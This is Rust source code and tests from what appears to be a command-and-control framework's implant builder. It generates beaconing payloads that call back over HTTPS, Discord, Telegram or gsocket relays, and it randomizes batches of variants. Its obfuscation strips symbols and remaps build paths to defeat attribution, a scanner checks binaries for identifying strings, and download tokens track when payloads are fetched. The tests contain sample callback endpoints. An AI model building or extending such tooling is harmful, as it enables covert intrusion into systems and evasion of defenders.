    let mut meta = std::fs::read(&sidecar)
        .ok()
        .and_then(|bytes| serde_json::from_slice::<PayloadMeta>(&bytes).ok())
        .unwrap_or_else(|| fallback_meta(file, &dir.join(file)));
    let now = chrono::Utc::now().to_rfc3339();
    meta.retrievals = meta.retrievals.saturating_add(1);
    meta.first_retrieved_at.get_or_insert_with(|| now.clone());
    meta.last_retrieved_at = Some(now);
    write_metadata_atomic(&sidecar, &meta)
}

/// Resolve an unguessable public download token to the artifact it names.
/// The path comes from the directory entry, never from sidecar-controlled data.
/// Resolved from disk on every request: the directory is small and this avoids
/// a stale once-loaded cache racing concurrent writers.
pub fn public_download(token: &str) -> Option<(PathBuf, String)> {
    valid_public_uuid(token)?;
    let dir = Path::new(PAYLOAD_DIR);
    let meta = list_from_dir(dir)
        .ok()?
        .into_iter()
        .find(|m| m.public_id == token)?;
    Some((dir.join(&meta.file), meta.file))
}

#[cfg(test)]
mod tests {
    use super::resolve_target;
    #[test]
    fn empty_target_derives_triple_from_platform() {
        let t = resolve_target("windows", "amd64", "").unwrap();
        assert_eq!(t, "x86_64-pc-windows-gnu");
        let t = resolve_target("linux", "amd64", "").unwrap();
        assert!(t.contains("linux"), "got {t}");
    }

    #[test]
    fn native_and_explicit_target_are_preserved() {
        assert_eq!(resolve_target("current", "current", "").unwrap(), "");
        assert_eq!(
            resolve_target("windows", "amd64", "x86_64-unknown-linux-musl").unwrap(),
            "x86_64-unknown-linux-musl"
        );
    }

    #[test]
    fn unknown_platform_is_rejected_not_silently_host_built() {
        assert!(resolve_target("windows", "riscv64", "").is_err());
    }

    use super::*;
    use std::io::{Read, Seek};

    /// Chat channels are `<token>@<address>` with no port. Building them through
    /// the generic host/port path produced `discord://host:port`, which the
    /// implant rejects outright, so the wizard option could never have worked.
    #[test]
    fn chat_payloads_build_a_token_address_endpoint() {
        let (config, _, _) = payload_config(
            &BuildRequest {
                name: "dc".into(),
                lhost: String::new(),
                lport: 0,
                protocol: "discord".into(),
                gsocket_secret: None,
                gsocket_local_port: None,
                chat_token: Some("MTIzNDU2.token.x".into()),
                chat_address: Some("1234567890".into()),
                os: "linux".into(),
                arch: "amd64".into(),
                interval_ms: 1000,
                jitter_ms: 0,
                target: String::new(),
                harden: true,
            },
            b"psk",
        )
        .unwrap();
        assert_eq!(config.endpoint, "discord://MTIzNDU2.token.x@1234567890");
        // The scheme delimiter is expected; what must be absent is a port on
        // the address side, since the beacon parses `<token>@<channel>`.
        let (_, address) = config
            .endpoint
            .split_once('@')
            .expect("chat endpoint is token@address");
        assert!(
            !address.contains(':'),
            "a chat address must not carry a port, got {address:?}"
        );
    }

    #[test]
    fn telegram_chat_payloads_use_the_same_shape() {
        let (config, _, _) = payload_config(
            &BuildRequest {
                name: "tg".into(),
                lhost: String::new(),
                lport: 0,
                protocol: "telegram".into(),
                gsocket_secret: None,
                gsocket_local_port: None,
                chat_token: Some("123:ABC".into()),
                chat_address: Some("-100123".into()),
                os: "linux".into(),
                arch: "amd64".into(),
                interval_ms: 1000,
                jitter_ms: 0,
                target: String::new(),
                harden: true,
            },
            b"psk",
        )
        .unwrap();
        assert_eq!(config.endpoint, "telegram://123:ABC@-100123");
    }

    /// An incomplete chat payload must fail the build rather than emit an
    /// endpoint the beacon could never use.
    #[test]
    fn chat_payloads_require_token_and_address() {
        for (token, address) in [
            (None, Some("123".to_owned())),
            (Some("tok".to_owned()), None),
            (Some("   ".to_owned()), Some("123".to_owned())),
            (Some("tok".to_owned()), Some("".to_owned())),
        ] {
            let result = payload_config(
                &BuildRequest {
                    name: "x".into(),
                    lhost: String::new(),
                    lport: 0,
                    protocol: "discord".into(),
                    gsocket_secret: None,
                    gsocket_local_port: None,
                    chat_token: token,
                    chat_address: address,
                    os: "linux".into(),
                    arch: "amd64".into(),
                    interval_ms: 1000,
                    jitter_ms: 0,
                    target: String::new(),
                    harden: true,
                },
                b"psk",
            );
            assert!(result.is_err(), "incomplete chat payload must be rejected");
        }
    }

    /// A credential containing an endpoint delimiter would change how the
    /// beacon parses its own address, so reject it at build time.
    #[test]
    fn chat_credentials_reject_endpoint_delimiters() {
        for (token, address) in [
            (Some("has/slash".to_owned()), Some("123".to_owned())),
            (Some("has@at".to_owned()), Some("123".to_owned())),
            (Some("tok".to_owned()), Some("has/slash".to_owned())),
            (Some("tok".to_owned()), Some("has space".to_owned())),
        ] {
            let result = payload_config(
                &BuildRequest {
                    name: "x".into(),
                    lhost: String::new(),
                    lport: 0,
                    protocol: "discord".into(),
                    gsocket_secret: None,
                    gsocket_local_port: None,
                    chat_token: token,
                    chat_address: address,
                    os: "linux".into(),
                    arch: "amd64".into(),
                    interval_ms: 1000,
                    jitter_ms: 0,
                    target: String::new(),
                    harden: true,
                },
                b"psk",
            );
            assert!(
                result.is_err(),
                "a delimiter in a chat credential must be rejected"
            );
        }
    }

    /// Host-based protocols must be unaffected by the chat fields, including
    /// the host validation that chat endpoints bypass.
    #[test]
    fn host_protocols_ignore_chat_credentials_and_still_validate() {
        let (config, host, port) = payload_config(
            &BuildRequest {
                name: "h".into(),
                lhost: "c2.lab.example".into(),
                lport: 8443,
                protocol: "https".into(),
                gsocket_secret: None,
                gsocket_local_port: None,
                chat_token: Some("tok".into()),
                chat_address: Some("123".into()),
                os: "linux".into(),
                arch: "amd64".into(),
                interval_ms: 1000,
                jitter_ms: 0,
                target: String::new(),
                harden: true,
            },
            b"psk",
        )
        .unwrap();
        assert_eq!(config.endpoint, "https://c2.lab.example:8443");
        assert_eq!(host, "c2.lab.example");
        assert_eq!(port, 8443);

        let rejected = payload_config(
            &BuildRequest {
                name: "h".into(),
                lhost: "has/slash".into(),
                lport: 8443,
                protocol: "https".into(),
                gsocket_secret: None,
                gsocket_local_port: None,
                chat_token: None,
                chat_address: None,
                os: "linux".into(),
                arch: "amd64".into(),
                interval_ms: 1000,
                jitter_ms: 0,
                target: String::new(),
                harden: true,
            },
            b"psk",
        );
        assert!(rejected.is_err(), "host path validation must still apply");
    }

    #[test]
    fn sanitize_keeps_identifier_chars() {
        assert_eq!(sanitize("my-implant_2"), "my-implant_2");
        assert_eq!(sanitize("a b/c!d"), "abcd");
        assert_eq!(sanitize("---"), "");
    }

    #[test]
    fn build_id_and_binary_path() {
        assert_eq!(build_id("x", "linux", "amd64"), "x.linux.amd64");
        assert!(built_binary("").ends_with("target/release/nw-implant"));
        assert!(
            built_binary("x86_64-unknown-linux-musl")
                .ends_with("target/x86_64-unknown-linux-musl/release/nw-implant")
        );
        assert!(
            built_binary("x86_64-pc-windows-gnu")
                .ends_with("target/x86_64-pc-windows-gnu/release/nw-implant.exe")
        );
    }

    #[test]
    fn building_jobs_empty_by_default() {
        assert!(building_jobs().is_empty());
    }

    #[test]
    fn predict_file_matches_build_output_prefix() {
        let req = BuildRequest {
            name: "win-1".into(),
            lhost: "127.0.0.1".into(),
            lport: 8080,
            protocol: "http".into(),
            gsocket_secret: None,
            gsocket_local_port: None,
            chat_token: None,
            chat_address: None,
            os: "windows".into(),
            arch: "amd64".into(),
            interval_ms: 1000,
            jitter_ms: 200,
            target: "x86_64-pc-windows-gnu".into(),
            harden: false,
        };
        assert_eq!(predict_file(&req), "win-1.windows.amd64");

        record_build_error("win-1.windows.amd64", "boom");
        assert_eq!(recent_errors()[0].0, "win-1.windows.amd64");
        clear_build_errors("win-1.windows.amd64");
        assert!(
            !recent_errors()
                .iter()
                .any(|(file, _, _)| file == "win-1.windows.amd64")
        );
    }

    #[test]
    fn direct_callback_config_uses_the_active_server_psk() {
        let req = BuildRequest {
            name: "linux".into(),
            lhost: "gateofbabylon.space".into(),
            lport: 443,
            protocol: "https".into(),
            os: "linux".into(),
            arch: "amd64".into(),
            ..Default::default()
        };

        let (config, host, port) = payload_config(&req, b"active-server-secret").unwrap();

        assert_eq!(config.endpoint, "https://gateofbabylon.space:443");
        assert_eq!(config.psk, "active-server-secret");
        assert_eq!(host, "gateofbabylon.space");
        assert_eq!(port, 443);
    }

    #[test]
    fn direct_callback_config_rejects_a_url_path_in_lhost() {
        let req = BuildRequest {
            lhost: "gateofbabylon.space/c2/checkin".into(),
            lport: 443,
            protocol: "https".into(),
            ..Default::default()
        };

        let error = payload_config(&req, b"active-server-secret").unwrap_err();

        assert!(error.to_string().contains("host only"));
    }

    #[test]
    fn direct_callback_config_brackets_an_ipv6_lhost() {
        let req = BuildRequest {
            lhost: "2001:db8::10".into(),
            lport: 443,
            protocol: "https".into(),
            ..Default::default()
        };

        let (config, host, _) = payload_config(&req, b"active-server-secret").unwrap();

        assert_eq!(config.endpoint, "https://[2001:db8::10]:443");
        assert_eq!(host, "2001:db8::10");
    }

    #[test]
    fn legacy_payload_gets_one_persisted_public_uuid() {
        let temp = tempfile::tempdir().unwrap();
        let file = "legacy.linux.amd64";
        std::fs::write(temp.path().join(file), b"payload").unwrap();
        let sidecar = temp.path().join(format!("{file}.json"));
        std::fs::write(
            &sidecar,
            serde_json::to_vec(&serde_json::json!({
                "file": file,
                "name": "legacy",
                "os": "linux",
                "arch": "amd64",
                "protocol": "https",
                "lhost": "gateofbabylon.space",
                "lport": 443,
                "psk": "test-only",
                "interval_ms": 5000,
                "jitter_ms": 1000,
                "target": "x86_64-unknown-linux-musl",
                "size": 7,
                "built_at": "2026-09-10T00:00:00Z"
            }))
            .unwrap(),
        )
        .unwrap();

        let first = list_from_dir(temp.path()).unwrap();
        let public_id = first[0].public_id.clone();
        assert_eq!(
            Uuid::parse_str(&public_id).unwrap().get_version(),
            Some(uuid::Version::Random)
        );
        assert_eq!(list_from_dir(temp.path()).unwrap()[0].public_id, public_id);

        let persisted: serde_json::Value =
            serde_json::from_slice(&std::fs::read(sidecar).unwrap()).unwrap();
        assert_eq!(persisted["public_id"], public_id);
        assert!(persisted.get("psk").is_none());
    }

    #[test]
    fn direct_callback_config_rejects_non_host_authority_syntax() {
        for host in [
            "good.example@evil.example",
            "good.example\\@evil.example",
            "good.example%2fevil",
            "good.example:443",
            "-bad.example",
        ] {
            let req = BuildRequest {
                lhost: host.into(),
                lport: 443,
                protocol: "https".into(),
                ..Default::default()
            };

            assert!(
                payload_config(&req, b"active-server-secret").is_err(),
                "accepted invalid host {host:?}"
            );
        }
    }

    #[test]
    fn gsocket_config_uses_server_psk_and_keeps_relay_secret_separate() {
        let req = BuildRequest {
            protocol: "gs".into(),
            lport: 4630,
            gsocket_secret: Some("relay-secret".into()),
            gsocket_local_port: Some(4630),
            ..Default::default()
        };

        let (config, host, port) = payload_config(&req, b"active-server-secret").unwrap();

        assert_eq!(config.psk, "active-server-secret");
        assert_eq!(config.gsocket.unwrap().secret, "relay-secret");
        assert_eq!(host, "127.0.0.1");
        assert_eq!(port, 4630);
    }

    #[test]
    fn rebuilding_a_payload_preserves_its_public_uuid() {
        let temp = tempfile::tempdir().unwrap();
        let file = "stable.windows.amd64";
        let artifact = temp.path().join(file);
        std::fs::write(&artifact, b"old").unwrap();
        let original_id = "550e8400-e29b-41d4-a716-446655440000";
        let mut original = fallback_meta(file, &artifact);
        original.public_id = original_id.into();
        std::fs::write(
            temp.path().join(format!("{file}.json")),
            serde_json::to_vec_pretty(&original).unwrap(),
        )
        .unwrap();

        let mut rebuilt = fallback_meta(file, &artifact);
        rebuilt.public_id = Uuid::new_v4().to_string();
        store_payload_metadata(temp.path(), &mut rebuilt).unwrap();

        assert_eq!(rebuilt.public_id, original_id);
        let persisted: PayloadMeta = serde_json::from_slice(
            &std::fs::read(temp.path().join(format!("{file}.json"))).unwrap(),
        )
        .unwrap();
        assert_eq!(persisted.public_id, original_id);
    }

    #[test]
    fn public_download_index_resolves_v4_tokens_without_sidecar_io() {
        let temp = tempfile::tempdir().unwrap();
        let file = "indexed.bin";
        let artifact = temp.path().join(file);
        std::fs::write(&artifact, b"indexed").unwrap();
        let token = "550e8400-e29b-41d4-a716-446655440000";
        let mut meta = fallback_meta(file, &artifact);
        meta.public_id = token.into();
        let mut index = PublicDownloadIndex::default();
        index.replace(temp.path(), &[meta]);

        let (_, filename) = index.resolve(token).unwrap();
        assert_eq!(filename, file);
        assert!(
            index
                .resolve("00000000-0000-0000-0000-000000000000")
                .is_none()
        );
    }

    #[test]
    fn concurrent_legacy_backfill_publishes_one_uuid() {
        let temp = tempfile::tempdir().unwrap();
        let file = "concurrent.linux.amd64";
        std::fs::write(temp.path().join(file), b"payload").unwrap();
        let workers = 8;
        let barrier = std::sync::Arc::new(std::sync::Barrier::new(workers));
        let handles = (0..workers)
            .map(|_| {
                let barrier = barrier.clone();
                let dir = temp.path().to_owned();
                std::thread::spawn(move || {
                    barrier.wait();
                    list_from_dir(&dir).unwrap()[0].public_id.clone()
                })
            })
            .collect::<Vec<_>>();
        let ids = handles
            .into_iter()
            .map(|handle| handle.join().unwrap())
            .collect::<Vec<_>>();

        assert!(ids.iter().all(|id| id == &ids[0]));
        let persisted: PayloadMeta = serde_json::from_slice(
            &std::fs::read(temp.path().join(format!("{file}.json"))).unwrap(),
        )
        .unwrap();
        assert_eq!(persisted.public_id, ids[0]);
    }

    #[test]
    fn payload_listing_ignores_atomic_publish_temporary_files() {
        let temp = tempfile::tempdir().unwrap();
        std::fs::write(
            temp.path().join("artifact.json.550e8400.tmp"),
            b"sensitive metadata",
        )
        .unwrap();
        std::fs::write(temp.path().join("artifact.550e8400.tmp"), b"partial").unwrap();

        assert!(list_from_dir(temp.path()).unwrap().is_empty());
    }

    #[test]
    fn delete_removes_binary_sidecar_and_build_error() {
        let temp = tempfile::tempdir().unwrap();
        let file = "gone.linux.amd64";
        std::fs::write(temp.path().join(file), b"payload").unwrap();
        let sidecar = temp.path().join(format!("{file}.json"));
        std::fs::write(
            &sidecar,
            serde_json::to_vec_pretty(&fallback_meta(file, &temp.path().join(file))).unwrap(),
        )
        .unwrap();
        record_build_error(file, "boom");
        let public_id = list_from_dir(temp.path()).unwrap()[0].public_id.clone();

        delete_from_dir(temp.path(), file).unwrap();

        assert!(!temp.path().join(file).exists());
        assert!(!sidecar.exists());
        assert!(!recent_errors().iter().any(|(f, _, _)| f == file));
        assert!(Uuid::parse_str(&public_id).is_ok());
    }

    #[test]
    fn delete_refuses_missing_or_building_payloads() {
        let temp = tempfile::tempdir().unwrap();
        let file = "busy.linux.amd64";
        std::fs::write(temp.path().join(file), b"payload").unwrap();

        assert!(delete_from_dir(temp.path(), "nope.linux.amd64").is_err());

        let file = file.to_owned();
        mark_building(BuildJob {
            file: file.clone(),
            name: "busy".into(),
            target: String::new(),
            os: "linux".into(),
            arch: "amd64".into(),
            started_at: "now".into(),
        });
        let busy = delete_from_dir(temp.path(), &file);
        unmark_building(&file);
        assert!(
            busy.unwrap_err().to_string().contains("still building"),
            "expected building guard to block deletion"
        );
    }

    #[tokio::test]
    async fn artifact_publish_atomically_replaces_the_download() {
        let temp = tempfile::tempdir().unwrap();
        let source = temp.path().join("new-build");
        let destination = temp.path().join("payload.bin");
        std::fs::write(&source, b"new-complete-payload").unwrap();
        std::fs::write(&destination, b"old-complete-payload").unwrap();
        let mut active_download = std::fs::File::open(&destination).unwrap();

        publish_artifact(&source, &destination).await.unwrap();

        let mut old_bytes = Vec::new();
        active_download.rewind().unwrap();
        active_download.read_to_end(&mut old_bytes).unwrap();
        assert_eq!(old_bytes, b"old-complete-payload");
        assert_eq!(std::fs::read(destination).unwrap(), b"new-complete-payload");
    }
}

#[cfg(test)]
mod randomization_tests {
    use super::*;

    fn base() -> BuildRequest {
        BuildRequest {
            name: "fleet".into(),
            lhost: "192.0.2.10".into(),
            lport: 8080,
            protocol: "http".into(),
            gsocket_secret: None,
            gsocket_local_port: None,
            chat_token: None,
            chat_address: None,
            os: "linux".into(),
            arch: "amd64".into(),
            interval_ms: 5000,
            jitter_ms: 1000,
            target: String::new(),
            harden: true,
        }
    }

    #[test]
    fn a_seeded_batch_is_reproducible() {
        let a = randomize(&base(), 5, Some(7));
        let b = randomize(&base(), 5, Some(7));
        assert_eq!(a, b);
    }

    #[test]
    fn variants_get_distinct_artifact_names() {
        let variants = randomize(&base(), 8, Some(3));
        let mut names: Vec<_> = variants.iter().map(|v| v.name.clone()).collect();
        names.sort();
        names.dedup();
        assert_eq!(names.len(), 8, "variants must not collide on artifact name");
        for variant in &variants {
            assert!(variant.name.starts_with("fleet-"), "{}", variant.name);
            assert_eq!(sanitize(&variant.name), variant.name);
        }
    }

    #[test]
    fn variants_keep_the_operator_endpoint_and_protocol() {
        for variant in randomize(&base(), 6, Some(11)) {
            assert_eq!(variant.lhost, "192.0.2.10");
            assert_eq!(variant.lport, 8080);
            assert_eq!(variant.protocol, "http");
            assert_eq!(variant.os, "linux");
            assert_eq!(variant.arch, "amd64");
        }
    }

    #[test]
    fn cadence_stays_inside_the_sane_envelope() {
        for variant in randomize(&base(), 12, Some(5)) {
            assert!(
                variant.interval_ms >= 5000 && variant.interval_ms <= 10_000,
                "interval {} out of range",
                variant.interval_ms
            );
            assert!(
                variant.jitter_ms <= variant.interval_ms,
                "jitter {} exceeds interval {}",
                variant.jitter_ms,
                variant.interval_ms
            );
        }
    }

    #[test]
    fn variants_produce_distinct_artifact_filenames() {
        let variants = randomize(&base(), 6, Some(9));
        let mut files: Vec<_> = variants.iter().map(predict_file).collect();
        files.sort();
        files.dedup();
        assert_eq!(files.len(), 6);
        assert!(files[0].starts_with("fleet-") && files[0].ends_with(".linux.amd64"));
    }

    #[test]
    fn the_variant_count_is_bounded() {
        assert_eq!(randomize(&base(), 0, Some(1)).len(), 1);
        assert_eq!(
            randomize(&base(), 5_000, Some(1)).len(),
            MAX_RANDOM_VARIANTS
        );
    }

    #[test]
    fn jitter_is_clamped_to_the_interval() {
        assert_eq!(effective_jitter(1000, 60_000), 1000);
        assert_eq!(effective_jitter(1000, 250), 250);
        assert_eq!(effective_jitter(0, 500), 0);
    }

    #[test]
    fn retrieval_is_absent_until_something_is_fetched() {
        let meta = fallback_meta("x.linux.amd64", Path::new("payloads"));
        assert!(!meta.was_retrieved());
        assert_eq!(meta.retrievals, 0);
        let mut fetched = meta.clone();
        fetched.retrievals = 1;
        fetched.first_retrieved_at = Some("2026-01-01T00:00:00Z".into());
        assert!(fetched.was_retrieved());
    }

    #[test]
    fn a_legacy_sidecar_without_retrieval_fields_still_deserializes() {
        // Sidecars written before tracking existed must keep working rather
        // than silently reading as "retrieved".
        let legacy = r#"{"file":"a.linux.amd64","name":"a","os":"linux","arch":"amd64",
            "protocol":"http","lhost":"127.0.0.1","lport":1,"public_id":"","size":1,
            "built_at":"2026-01-01T00:00:00Z"}"#;
        let meta: PayloadMeta = serde_json::from_str(legacy).unwrap();
        assert!(!meta.was_retrieved());
        assert_eq!(meta.retrievals, 0);
    }
}

#[cfg(test)]
mod obfuscation_tests {
    use super::*;

    fn rng(seed: u64) -> StdRng {
        StdRng::seed_from_u64(seed)
    }

    fn pairs() -> Vec<(String, String)> {
        remap_pairs(&mut rng(1))
    }

    #[test]
    fn hardening_is_on_by_default() {
        let hardening = Obfuscation::default();
        assert!(hardening.strip_symbols && hardening.remap_paths && hardening.panic_abort);
        assert!(!Obfuscation::none().strip_symbols);
    }

    #[test]
    fn no_hardening_adds_no_environment() {
        let applied = Obfuscation::none().applied(&mut rng(2), &pairs());
        assert!(applied.is_empty(), "{applied:?}");
    }

    #[test]
    fn hardening_covers_every_knob() {
        let applied = Obfuscation::default().applied(&mut rng(3), &pairs());
        let keys: Vec<String> = applied.iter().map(|(key, _)| key.clone()).collect();
        assert!(keys.contains(&"CARGO_PROFILE_RELEASE_STRIP".to_owned()));
        assert!(keys.contains(&"CARGO_PROFILE_RELEASE_LTO".to_owned()));
        assert!(keys.contains(&"CARGO_PROFILE_RELEASE_PANIC".to_owned()));
        assert!(keys.contains(&"CARGO_PROFILE_RELEASE_CODEGEN_UNITS".to_owned()));
        assert!(keys.contains(&"RUSTFLAGS".to_owned()));
    }

    /// The bug that made the first implementation useless: remapping `/` only
    /// strips the leading separator, so the username and repo name survive.
    #[test]
    fn each_sensitive_root_is_remapped_in_full_not_just_the_leading_slash() {
        let roots = sensitive_path_roots();
        assert!(
            !roots.is_empty(),
            "there is always at least the manifest dir"
        );
        for root in &roots {
            assert!(
                root.starts_with('/'),
                "{root} must be absolute to be remapped"
            );
        }
        let flags = Obfuscation::default().rustflags(&mut rng(4), &pairs());
        let joined = flags.join(" ");
        assert!(
            !joined.contains("--remap-path-prefix=/="),
            "a bare `/` rule leaves the rest of the path readable: {joined}"
        );
        // The left-hand side necessarily names the real path; what matters is
        // that it is the *full* path rather than a bare separator.
        assert!(
            joined.contains(&format!(
                "--remap-path-prefix={}=",
                env!("CARGO_MANIFEST_DIR")
            )),
            "the workspace root must be remapped by its full path: {joined}"
        );
    }

    #[test]
    fn each_real_root_gets_a_distinct_fake_root() {
        let applied: Vec<(String, String)> = pairs();
        let mut fakes: Vec<&String> = applied.iter().map(|(_, fake)| fake).collect();
        let before = fakes.len();
        fakes.sort();
        fakes.dedup();
        assert_eq!(fakes.len(), before, "fake roots must not collapse together");
    }

    #[test]
    fn remapped_paths_contain_no_real_directory_names() {
        let workspace = env!("CARGO_MANIFEST_DIR").to_owned();
        let flags = Obfuscation::default().rustflags(&mut rng(5), &pairs());
        // Only the replacement side is embedded in the artifact, so only the
        // replacement side must be free of real directory names.
        // `--remap-path-prefix=<real>=<fake>` contains two `=`, so the
        // replacement is on the right of the *last* one.
        let replacements: Vec<&str> = flags
            .iter()
            .filter(|flag| flag.starts_with("--remap-path-prefix="))
            .filter_map(|flag| flag.rsplit_once('=').map(|(_, replacement)| replacement))
            .collect();
        assert!(!replacements.is_empty(), "expected remap replacements");
        for replacement in &replacements {
            assert!(
                !replacement.contains(&workspace),
                "replacement {replacement} repeats the workspace path"
            );
            assert!(replacement.starts_with('/'));
        }
        // The user's home directory must not survive into any replacement.
        if let Some(home) = std::env::var("HOME").ok().filter(|h| h.len() > 1) {
            for replacement in &replacements {
                assert!(
                    !replacement.contains(home.as_str()),
                    "replacement {replacement} repeats the home directory"
                );
            }
        }
    }

    #[test]
    fn the_metadata_hash_differs_per_build() {
        let first = Obfuscation::default().rustflags(&mut rng(6), &pairs());
        let second = Obfuscation::default().rustflags(&mut rng(7), &pairs());
        assert_ne!(first, second, "two builds must not share a metadata hash");
    }

    #[test]
    fn existing_rustflags_are_appended_not_clobbered() {
        // SAFETY: single-threaded test body touching the process environment.
        unsafe { std::env::set_var("RUSTFLAGS", "-Ctarget-cpu=x86-64-v2") };
        let applied = Obfuscation::default().applied(&mut rng(8), &pairs());
        let flags = applied
            .iter()
            .find(|(key, _)| key == "RUSTFLAGS")
            .map(|(_, value)| value.clone())
            .expect("rustflags");
        assert!(flags.starts_with("-Ctarget-cpu=x86-64-v2"), "{flags}");
        assert!(flags.contains("-Cmetadata="), "{flags}");
        unsafe { std::env::remove_var("RUSTFLAGS") };
    }

    #[test]
    fn a_clean_artifact_reports_clean() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("clean.bin");
        std::fs::write(&path, b"no markers here at all").unwrap();
        let report = fingerprint_scan(&path).unwrap();
        assert!(report.is_clean(), "{}", report.summary());
        assert_eq!(report.bytes_scanned, 22);
    }

    #[test]
    fn a_leaking_artifact_is_reported_with_the_markers_it_found() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("leaky.bin");
        std::fs::write(
            &path,
            b"panic at /Users/someone/projects/naughtywolf/src/main.rs tokio::runtime::x",
        )
        .unwrap();
        let report = fingerprint_scan(&path).unwrap();
        assert!(!report.is_clean());
        assert!(report.build_paths.contains(&"/Users/".to_owned()));
        assert!(report.project_strings.contains(&"naughtywolf".to_owned()));
        assert!(report.dependency_symbols.contains(&"tokio::".to_owned()));
    }

    #[test]
    fn scanning_a_missing_artifact_is_an_error_not_a_clean_report() {
        assert!(fingerprint_scan(std::path::Path::new("/nonexistent/artifact")).is_err());
    }

    #[test]
    fn a_legacy_sidecar_without_a_fingerprint_still_loads() {
        let legacy = r#"{"file":"a","name":"a","os":"linux","arch":"amd64","protocol":"http",
            "lhost":"127.0.0.1","lport":1,"public_id":"","size":1,"built_at":"x"}"#;
        let meta: PayloadMeta = serde_json::from_str(legacy).unwrap();
        assert!(meta.fingerprint.is_none());
    }

    #[test]
    fn the_build_request_carries_the_hardening_flag_through_randomization() {
        let mut request = BuildRequest {
            name: "fleet".into(),
            lhost: "192.0.2.10".into(),
            lport: 8080,
            protocol: "http".into(),
            gsocket_secret: None,
            gsocket_local_port: None,
            chat_token: None,
            chat_address: None,
            os: "linux".into(),
            arch: "amd64".into(),
            interval_ms: 5000,
            jitter_ms: 1000,
            target: String::new(),
            harden: true,
        };
        for variant in randomize(&request, 3, Some(1)) {
            assert!(variant.harden, "hardening must survive randomization");
        }
        request.harden = false;
        for variant in randomize(&request, 3, Some(1)) {
            assert!(
                !variant.harden,
                "an explicit opt-out must survive randomization"
            );
        }
    }
}
